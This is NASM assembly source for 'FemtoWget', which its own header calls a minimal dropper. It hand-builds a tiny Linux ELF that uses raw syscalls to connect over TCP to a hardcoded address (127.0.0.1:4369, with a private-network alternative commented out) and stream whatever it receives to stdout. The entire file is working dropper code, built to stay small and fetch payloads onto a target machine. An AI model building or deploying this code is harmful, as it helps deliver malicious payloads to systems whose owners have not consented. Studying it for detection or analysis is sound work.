;;; 
;;;  *  fwget. FemtoWget. Minimal dropper in asm (Base version)
;;;  *  Copyright (c) 2020 pico (@0x00pico at twitter)
;;;  *
;;;  *  This program is free software: you can redistribute it and/or modify
;;;  *  it under the terms of the GNU General Public License as published by
;;;  *  the Free Software Foundation, either version 3 of the License, or
;;;  *  (at your option) any later version.
;;;  *  This program is distributed in the hope that it will be useful,
;;;  *  but WITHOUT ANY WARRANTY; without even the implied warranty of
;;;  *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;;;  *  GNU General Public License for more details.
;;;  *  You should have received a copy of the GNU General Public License
;;;  *  along with this program.  If not, see <http://www.gnu.org/licenses/>.

BITS 64
	        org 0x400000
  ehdr:                                                 ; Elf32_Ehdr
                db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
        times 8 db      0
                dw      2                               ;   e_type
                dw      0x3e                            ;   e_machine
                dd      1                               ;   e_version
                dq      _start                          ;   e_entry
                dq      phdr - $$                       ;   e_phoff
                dq      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  
  ehdrsize      equ     $ - ehdr
  
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      5                               ;   p_offset
	        dq      0
                dq      $$                              ;   p_vaddr
                dq      $$                              ;   p_paddr
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
  
  phdrsize      equ     $ - phdr


	;;  Compile
	;; nasm -f bin -o hellos hello64.asm; chmod +x hellos

	;;  https://0x00sec.org/t/the-price-of-scripting-dietlibc-vs-asm/791/7
_start:
	push rbp
	mov  rbp, rsp
	sub  rsp, 1024 + 8 + 8	; Read buffer + Socket + size 
	
	;; 	mov rdi, 1
	;; 	lea rsi, [rel msg1]
	;; 	mov rdx, 7

	;; 	call _write

	;; Variables
	;; [rbp + 0x00] -> s (socket)
	;; [rbp + 0x08] -> len (int)
	;; [rbp + 0x10] -> buf (unsigned char)
	;; Create socket
	;; Find contants with: grep -R CONSTANT /usr/include
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov rdi, 2		; PF_INET 2
	mov rsi, 1		; SOCK_STREAM
	mov rdx, 6              ; IPPROTO_TCP
	mov r8, 10 
	call _socket
	mov [rbp + 0x00], rax	
	mov r9, rax
	cmp rax, 0
	jle error
	

	;; connect (s [rbp+0], addr, 16)
	mov rdi, rax
	;; 	mov rsi, 0x8c0aa8c011110002
	;; 	mov rsi, 0x0100007f11110002
	lea rsi, [rel addr]
	mov rdx, 16
	mov r8, 20
	call _connect
	test eax, eax
	jl error

l0:				; Read loop
	;; Read data from socket
	;; _read (s = [rbp + 0], [rbp + 0x10], 1024);
	mov rdi, [rbp + 0]
	lea rsi, [rbp+0x10]
	mov rdx, 1024
	call _read
	mov [rbp + 0x08], rax	; Store number of bytes read
	cmp rax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rbp+0x10], [rbp+0x08])
	mov rdi, 1
	mov rdx, rax
	call _write
	cmp rax, 1024
	jl done
	jmp l0
done:
	;;  _close (s)
	mov rdi, [rbp + 0x00]	;
	call _close
	
	mov rdi, 0		; Success
	call _exit

error:
	mov rdi, 2
	lea rsi, [rel msg]
	mov rdx, 7
	call _write
	
	mov rdi, r9
	add rdi, r8
	call _exit
	;; Syscalls
_read:
	mov rax, 0
	syscall
	ret
	
_write:
	mov rax, 1
	syscall
	ret
	
_socket:
	mov rax, 41
	syscall
	ret
	
_connect:
	mov rax, 42
	syscall
	ret
	
_close:	mov rax, 3
	syscall
	ret
	
_exit:	mov rax, 60
	syscall
	ret
	
addr dq 0x0100007f11110002
msg  db "ERROR", 10,0
filesize equ $ - $$
